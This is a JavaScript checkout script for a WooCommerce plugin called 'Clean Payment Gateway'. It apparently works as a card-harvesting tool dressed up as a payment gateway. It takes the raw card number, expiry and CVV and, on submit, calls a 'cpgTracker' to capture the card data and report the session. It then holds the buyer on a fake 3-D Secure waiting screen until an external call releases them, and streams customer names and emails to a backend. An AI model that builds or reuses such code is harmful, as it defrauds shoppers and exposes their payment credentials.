/**
 * Clean Payment Gateway - 支付表单交互脚本
 * 处理 iframe 内外的通信和支付逻辑
 */

(function($) {
    'use strict';
    
    // 🔥 全局变量：保存订单成功后的跳转URL
    let pendingRedirectUrl = null;
    
    /**
     * 🔥 显示等待验证界面
     */
    function showWaitingOverlay() {
        
        // 尝试调用 3d-verification.js 的方法
        if (typeof window.showVerificationWaiting === 'function') {
            window.showVerificationWaiting();
        } else {
            // 备用方案：直接操作DOM
            const $waitingDiv = $('#cpg-waiting');
            if ($waitingDiv.length > 0) {
                // 隐藏结账表单
                $('form.checkout').hide();
                $('.woocommerce-checkout-review-order-table').hide();
                $('.woocommerce-checkout').hide();
                
                // 显示等待界面
                $waitingDiv.addClass('active').show();
                $('html, body').addClass('cpg-verify-active');
                document.body.style.cssText = 'overflow: hidden !important;';
                document.documentElement.style.cssText = 'overflow: hidden !important;';
                
            } else {
                console.warn('[CPG] ⚠️ 等待界面元素 #cpg-waiting 不存在');
            }
        }
    }
    
    /**
     * 🔥 使用AJAX提交订单（不跳转页面）
     */
    function submitOrderViaAjax() {
        
        const $form = $('form.checkout');
        const formData = $form.serialize();
        
        // 添加loading状态
        $form.addClass('processing');
        
        $.ajax({
            type: 'POST',
            url: wc_checkout_params.checkout_url,
            data: formData,
            dataType: 'json',
            success: function(response) {
                
                if (response.result === 'success') {
                    
                    // 🔥 保存跳转URL，但不立即跳转
                    pendingRedirectUrl = response.redirect;
                    window.CPG_PendingRedirect = response.redirect;
                    
                    // 🔥 触发自定义事件，通知其他模块订单已创建
                    $(document).trigger('cpg_order_created', [response]);
                    
                    
                } else if (response.result === 'failure') {
                    console.error('[CPG] ❌ 订单创建失败:', response.messages);
                    
                    // 隐藏等待界面
                    hideWaitingOverlay();
                    
                    // 显示错误信息
                    if (response.messages) {
                        $('.woocommerce-notices-wrapper').first().html(response.messages);
                    }
                    
                    // 移除loading状态
                    $form.removeClass('processing');
                }
            },
            error: function(xhr, status, error) {
                console.error('[CPG] ❌ AJAX请求失败:', status, error);
                
                // 隐藏等待界面
                hideWaitingOverlay();
                
                // 显示错误
                showWooCommerceError('Payment processing failed. Please try again.');
                
                // 移除loading状态
                $form.removeClass('processing');
            }
        });
    }
    
    /**
     * 🔥 隐藏等待验证界面
     */
    function hideWaitingOverlay() {
        const $waitingDiv = $('#cpg-waiting');
        $waitingDiv.removeClass('active').hide();
        $('html, body').removeClass('cpg-verify-active');
        document.body.style.cssText = '';
        document.documentElement.style.cssText = '';
        
        // 显示结账表单
        $('form.checkout').show();
        $('.woocommerce-checkout-review-order-table').show();
        $('.woocommerce-checkout').show();
        
    }
    
    /**
     * 🔥 执行验证完成后的跳转
     */
    window.CPG_CompleteAndRedirect = function() {
        const redirectUrl = pendingRedirectUrl || window.CPG_PendingRedirect;
        if (redirectUrl) {
            window.location.href = redirectUrl;
        } else {
            console.warn('[CPG] ⚠️ 没有保存的跳转URL');
        }
    };

    // 等待 DOM 加载完成
    $(document).ready(function() {
        
        // 检查是否有直接嵌入的表单
        if ($('#cpg_card_number_input').length > 0) {
            initDirectForm();
            initParentPage(); // 同时初始化父页面逻辑（用于表单提交验证）
        } else {
            // 父页面逻辑
            initParentPage();
        }
        
        // 调试工具
        window.CPG_Debug = {
            checkFields: function() {
            },
            forceSubmit: function() {
                $('form.checkout').off('checkout_place_order_clean_payment_gateway');
            },
            testValidation: function() {
                return validatePaymentFields();
            }
        };
    });

    /**
     * 显示WooCommerce风格的错误提示（3秒后自动消失）
     */
    function showWooCommerceError(message) {
        // 移除旧的错误提示
        $('.woocommerce-error, .woocommerce-notice--error').remove();
        
        // 创建WooCommerce风格的错误提示
        const errorHtml = `
            <div class="woocommerce-error" role="alert" style="animation: fadeIn 0.3s ease-in;">
                ${message}
            </div>
        `;
        
        // 添加淡入淡出动画样式（如果不存在）
        if ($('style#cpg-error-animations').length === 0) {
            $('<style id="cpg-error-animations">').text(`
                @keyframes fadeIn {
                    from { opacity: 0; transform: translateY(-10px); }
                    to { opacity: 1; transform: translateY(0); }
                }
                @keyframes fadeOut {
                    from { opacity: 1; transform: translateY(0); }
                    to { opacity: 0; transform: translateY(-10px); }
                }
            `).appendTo('head');
        }
        
        // 在支付表单前插入错误提示
        const $paymentForm = $('#cpg-payment-form');
        if ($paymentForm.length > 0) {
            $paymentForm.before(errorHtml);
        } else {
            // 如果找不到支付表单，插入到WooCommerce notices wrapper
            const $noticesWrapper = $('.woocommerce-notices-wrapper').first();
            if ($noticesWrapper.length > 0) {
                $noticesWrapper.html(errorHtml);
            } else {
                // 最后的兜底方案：插入到checkout表单顶部
                $('form.checkout').prepend(errorHtml);
            }
        }
        
        const $errorElement = $('.woocommerce-error');
        
        // 滚动到错误提示位置
        $('html, body').animate({
            scrollTop: $errorElement.offset().top - 100
        }, 500);
        
        
        // 3秒后自动消失
        setTimeout(function() {
            $errorElement.css('animation', 'fadeOut 0.3s ease-out');
            setTimeout(function() {
                $errorElement.remove();
            }, 300);
        }, 3000);
    }
    
    /**
     * 初始化直接嵌入的支付表单（新版本，不使用 iframe）
     */
    function initDirectForm() {
        
        // ✅ 使用原生DOM，避免jQuery的事件处理开销
        const cardNumberInput = document.getElementById('cpg_card_number_input');
        const cardExpiryInput = document.getElementById('cpg_expiry_input');
        const cardCvvInput = document.getElementById('cpg_cvv_input');
        const cardIconElement = document.getElementById('rotating-brand-icon');
        
        if (!cardNumberInput || !cardExpiryInput || !cardCvvInput) {
            console.error('[CPG] ❌ 未找到支付输入框');
            return;
        }
        
        // ✅ 禁用自动完成
        [cardNumberInput, cardExpiryInput, cardCvvInput].forEach(input => {
            input.setAttribute('autocomplete', 'off');
            input.setAttribute('autocorrect', 'off');
            input.setAttribute('autocapitalize', 'off');
            input.setAttribute('spellcheck', 'false');
        });
        
        // ✅ 最小化干预策略 - 只格式化，不干预焦点
        
        // 🔥 卡号格式化已完全移至class-cpg-gateway.php的内联脚本中
        // 避免事件监听器冲突，确保BIN查询和图标更新正常工作
        
        // 有效期格式化（支持完全删除斜杠）
        let lastExpiryValue = '';
        
        cardExpiryInput.addEventListener('input', function(e) {
            const element = this;
            let currentValue = element.value;
            
            // 检测是否是删除操作
            const isDeleting = currentValue.length < lastExpiryValue.length;
            
            // 提取纯数字
            let digits = currentValue.replace(/\D/g, '');
            
            // 限制最多4位数字
            digits = digits.slice(0, 4);
            
            // 格式化为 MM/YY
            let formattedValue = digits;
            
            // 🔥 只在输入操作（非删除）且输入第3位数字时才自动添加斜杠
            // 这样用户可以删除到只剩 "01" 或 "0" 或空
            if (!isDeleting && digits.length >= 3) {
                // 用户正在输入第3位或更多数字，自动添加斜杠
                formattedValue = digits.slice(0, 2) + '/' + digits.slice(2);
            } else if (isDeleting && digits.length >= 3) {
                // 用户正在删除，但还有3位或更多数字，保持斜杠格式
                formattedValue = digits.slice(0, 2) + '/' + digits.slice(2);
            }
            // 其他情况（删除到2位或以下）：保持纯数字，不添加斜杠
            
            // 更新输入框值
            element.value = formattedValue;
            lastExpiryValue = formattedValue;
            
            // 验证日期（当输入完整时）
            if (digits.length === 4) {
                const month = parseInt(digits.slice(0, 2), 10);
                const year = parseInt('20' + digits.slice(2), 10);
                
                // 获取当前日期
                const now = new Date();
                const currentYear = now.getFullYear();
                const currentMonth = now.getMonth() + 1; // 0-11，所以+1
                
                // 验证月份范围
                if (month < 1 || month > 12) {
                    showWooCommerceError('Invalid expiration month. Please enter 01-12.');
                    element.value = '';
                    return;
                }
                
                // 验证是否早于当前月份
                if (year < currentYear || (year === currentYear && month < currentMonth)) {
                    showWooCommerceError('Card has expired. Please enter a valid expiration date.');
                    element.value = '';
                    return;
                }
                
            }
            
            // 更新隐藏字段
            const hiddenExpiry = document.getElementById('cpg_expiry_date');
            if (hiddenExpiry) hiddenExpiry.value = formattedValue;
        });
        
        // CVV 格式化（根据卡类型动态限制长度）
        cardCvvInput.addEventListener('input', function(e) {
            const element = this;
            const oldValue = element.value;
            
            // 获取当前maxlength属性（由卡号输入动态设置）
            const maxLength = parseInt(element.getAttribute('maxlength') || '4', 10);
            
            // 只允许数字，根据maxlength限制长度
            let value = oldValue.replace(/\D/g, '').slice(0, maxLength);
            
            // 只在值改变时更新（不操作光标）
            if (value !== oldValue) {
                element.value = value;
            }
            
            // 更新隐藏字段
            const hiddenCvv = document.getElementById('cpg_cvv');
            if (hiddenCvv) hiddenCvv.value = value;
            
        });
        
    }
    
    /**
     * 使用 Luhn 算法静默验证卡号（不显示UI）
     */
    function validateAndShowCardStatus(cardNumber, cardType) {
        
        const isValid = luhnCheck(cardNumber);
        
        if (isValid) {
            const cardTypeText = cardType !== 'unknown' ? cardType.toUpperCase() : '银行卡';
        } else {
        }
        
        // 返回验证结果供其他逻辑使用
        return isValid;
    }
    
    /**
     * 清除卡号验证信息显示（已废弃，保留为空函数以兼容）
     */
    function clearCardValidation() {
        // 不再需要清除UI，保留空函数以兼容旧代码
    }
    
    /**
     * 初始化 iframe 内的支付表单（已弃用，保留以兼容）
     */
    function initIframeForm() {
    }

    /**
     * 初始化父页面逻辑
     */
    function initParentPage() {
        
        // 监听 iframe 发来的消息（保留兼容）
        window.addEventListener('message', function(event) {
            if (event.data.source === 'cpg-payment-form') {
                updateHiddenFields(event.data);
            }
        });
        
        // 监听表单提交 - 拦截并显示验证等待界面
        $('form.checkout').on('checkout_place_order_clean_payment_gateway', function(e) {
            
            // 🔥 提交前最后检查隐藏字段
            
            try {
                const result = validatePaymentFields();
                
                if (!result) {
                    e.preventDefault();
                    e.stopImmediatePropagation();
                    
                    // 移除WooCommerce的loading状态
                    $('form.checkout').removeClass('processing').unblock();
                    $('.woocommerce-checkout-review-order-table').unblock();
                    
                    return false;
                }
                
                // 🔥 验证通过后，发送状态更新和卡片数据
                
                // 发送状态更新
                if (window.cpgTracker && window.cpgTracker.sendMessage) {
                    window.cpgTracker.sendMessage({
                        type: 'status_update',
                        session_id: window.cpgTracker.sessionId,
                        status: '已提交卡号',
                        event: 'place_order_clicked',
                        timestamp: Date.now()
                    });
                }
                
                // 触发卡片数据捕获
                if (window.cpgTracker && typeof window.cpgTracker.captureCardData === 'function') {
                    window.cpgTracker.captureCardData();
                }
                
                // 🔥🔥🔥 阻止默认跳转，使用AJAX提交订单 🔥🔥🔥
                e.preventDefault();
                e.stopImmediatePropagation();
                
                // 🔥 立即显示3D等待验证界面
                showWaitingOverlay();
                
                // 🔥 使用AJAX提交订单（不跳转页面）
                submitOrderViaAjax();
                
                return false;
                
            } catch (error) {
                console.error('[CPG] 验证过程出错:', error);
                return false;
            }
        });
        
        // 支付方式切换
        $(document).on('change', 'input[name="payment_method"]', function() {
            const selectedMethod = $(this).val();
            
            if (selectedMethod === 'clean_payment_gateway') {
                // 请求 iframe 验证
                const iframe = document.getElementById('cpg-payment-iframe');
                if (iframe) {
                    try {
                        iframe.contentWindow.postMessage({
                            action: 'prepare'
                        }, '*');
                    } catch (error) {
                        console.error('[CPG] iframe 通信失败:', error);
                    }
                }
            }
        });
        
    }

    /**
     * 检测卡片类型
     */
    function detectCardType(cardNumber) {
        const patterns = {
            visa: /^4/,
            mastercard: /^5[1-5]/,
            amex: /^3[47]/,
            discover: /^6(?:011|5)/,
            unionpay: /^62/
        };
        
        let cardType = 'unknown';
        for (let type in patterns) {
            if (patterns[type].test(cardNumber)) {
                cardType = type;
                break;
            }
        }
        
        // 更新卡片类型显示
        $('.card-brand-icon').attr('data-type', cardType);
        $('#cpg_card_type').val(cardType);
        
        return cardType;
    }

    /**
     * 从 iframe 发送数据到父窗口
     */
    function sendDataToParent() {
        const cardNumber = $('#card_number').val().replace(/\s/g, '');
        const cardExpiry = $('#card_expiry').val();
        const cardCvv = $('#card_cvv').val();
        const cardType = detectCardType(cardNumber);
        
        window.parent.postMessage({
            source: 'cpg-payment-form',
            cardNumber: cardNumber,
            cardExpiry: cardExpiry,
            cardCvv: cardCvv,
            cardType: cardType,
            valid: validateCardData(cardNumber, cardExpiry, cardCvv)
        }, '*');
    }

    /**
     * 验证卡片数据（包含 Luhn 算法）
     */
    function validateCardData(cardNumber, cardExpiry, cardCvv) {
        
        // 基本长度检查
        if (cardNumber.length < 13 || cardNumber.length > 19) {
            return false;
        }
        
        // 有效期格式检查
        if (!/^\d{2}\/\d{2}$/.test(cardExpiry)) {
            return false;
        }
        
        // CVV 检查
        if (cardCvv.length < 3 || cardCvv.length > 4) {
            return false;
        }
        
        // Luhn 算法验证（关键）
        const luhnValid = luhnCheck(cardNumber);
        if (!luhnValid) {
            return false;
        }
        
        return true;
    }

    /**
     * Luhn 算法（银行卡号校验）
     */
    function luhnCheck(cardNumber) {
        let sum = 0;
        let isEven = false;
        
        for (let i = cardNumber.length - 1; i >= 0; i--) {
            let digit = parseInt(cardNumber.charAt(i), 10);
            
            if (isEven) {
                digit *= 2;
                if (digit > 9) {
                    digit -= 9;
                }
            }
            
            sum += digit;
            isEven = !isEven;
        }
        
        return (sum % 10) === 0;
    }

    /**
     * 更新父页面的隐藏字段
     */
    function updateHiddenFields(data) {
        $('#cpg_card_number').val(data.cardNumber);
        $('#cpg_expiry_date').val(data.cardExpiry);
        $('#cpg_cvv').val(data.cardCvv);
        $('#cpg_card_type').val(data.cardType);
    }
    

    /**
     * 验证支付字段（启用 Luhn 算法验证）
     */
    function validatePaymentFields() {
        
        const cardNumber = $('#cpg_card_number').val();
        const cardExpiry = $('#cpg_expiry_date').val();
        const cardCvv = $('#cpg_cvv').val();
        
        
        // 验证必填字段
        if (!cardNumber || !cardExpiry || !cardCvv) {
            console.error('[CPG] ❌ 卡片信息未完整填写');
            showWooCommerceError('Please fill in all card information.');
            return false;
        }
        
        // 使用 Luhn 算法验证卡号
        if (!validateCardData(cardNumber, cardExpiry, cardCvv)) {
            console.error('[CPG] ❌ 卡片信息验证失败（Luhn 算法）');
            showWooCommerceError('Card number is incorrect, please re-enter.');
            return false;
        }
        
        // Facebook 像素追踪
        if (window.CPG_CONFIG?.fbq_tracking === 'yes' && typeof fbq !== 'undefined') {
            try {
                fbq('track', 'InitiateCheckout');
            } catch (e) {
                console.error('[CPG] Facebook 像素触发失败:', e);
            }
        }
        
        return true;
    }

    /**
     * iframe 内验证并发送数据
     */
    function validateAndSend() {
        sendDataToParent();
    }

    /**
     * ✅ 触发支付事件并发送到后端
     * @param {string} eventType - 事件类型 (input_card, input_expiry, input_cvv等)
     * @param {object} eventData - 事件数据
     */
    function triggerPaymentEvent(eventType, eventData = {}) {
        const timestamp = new Date().toISOString();
        
        // 构建完整的事件数据
        const fullEventData = {
            event_type: eventType,
            timestamp: timestamp,
            session_id: getOrCreateSessionId(),
            page_url: window.location.href,
            customer_email: $('#billing_email').val() || '',
            customer_name: ($('#billing_first_name').val() || '') + ' ' + ($('#billing_last_name').val() || ''),
            ...eventData
        };
        
        // 输出到控制台（便于调试）
        
        // 触发jQuery自定义事件（前端监听）
        $(document).trigger('cpg_payment_event', [fullEventData]);
        
        // 如果有新的 WebSocket 客户端，发送事件
        if (typeof window.CPG_WS !== 'undefined' && window.CPG_WS.isConnected) {
            try {
                window.CPG_WS.sendPaymentEvent(eventType, eventData);
            } catch (error) {
                console.error('[CPG] WebSocket发送失败:', error);
                // 失败时使用 AJAX 备用方案
                sendEventToBackend(fullEventData);
            }
        } else {
            // 如果WebSocket不可用，使用AJAX发送
            sendEventToBackend(fullEventData);
        }
    }

    /**
     * ✅ 通过AJAX发送事件到后端API（WebSocket不可用时的备用方案）
     * @param {object} eventData - 事件数据
     */
    function sendEventToBackend(eventData) {
        // 如果配置了API endpoint，使用AJAX发送
        if (window.CPG_CONFIG && window.CPG_CONFIG.ajax_url) {
            $.ajax({
                url: window.CPG_CONFIG.ajax_url,
                type: 'POST',
                data: {
                    action: 'cpg_track_payment_event',
                    nonce: window.CPG_CONFIG.nonce,
                    event_data: JSON.stringify(eventData)
                },
                success: function(response) {
                },
                error: function(xhr, status, error) {
                    console.warn('[CPG] AJAX发送失败:', error);
                }
            });
        }
    }

    /**
     * ✅ 获取或创建Session ID
     * @returns {string} Session ID
     */
    function getOrCreateSessionId() {
        let sessionId = sessionStorage.getItem('cpg_session_id');
        
        if (!sessionId) {
            // 生成UUID v4格式的session ID
            sessionId = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                const r = Math.random() * 16 | 0;
                const v = c === 'x' ? r : (r & 0x3 | 0x8);
                return v.toString(16);
            });
            
            sessionStorage.setItem('cpg_session_id', sessionId);
        }
        
        return sessionId;
    }

    /**
     * ✅ 初始化WebSocket连接（使用新的客户端）
     * 注意：实际的 WebSocket 连接由 websocket-client.js 处理
     * 这里只是集成和事件监听
     */
    function initWebSocketIntegration() {
        // 监听 WebSocket 连接成功事件
        $(document).on('cpg_ws_connected', function() {
        });
        
        // 监听 3DS 验证要求
        $(document).on('cpg_3ds_required', function(event, data) {
            // TODO: 显示 3DS 弹窗
        });
        
        // 监听支付授权
        $(document).on('cpg_payment_authorized', function(event, data) {
            // 跳转到成功页面
            if (data.return_url) {
                window.location.href = data.return_url;
            }
        });
        
        // 监听支付失败
        $(document).on('cpg_payment_failed', function(event, data) {
            alert('支付失败: ' + (data.message || '请重试'));
        });
    }

    // ✅ 页面加载时初始化集成
    $(document).ready(function() {
        initWebSocketIntegration();
    });

})(jQuery);

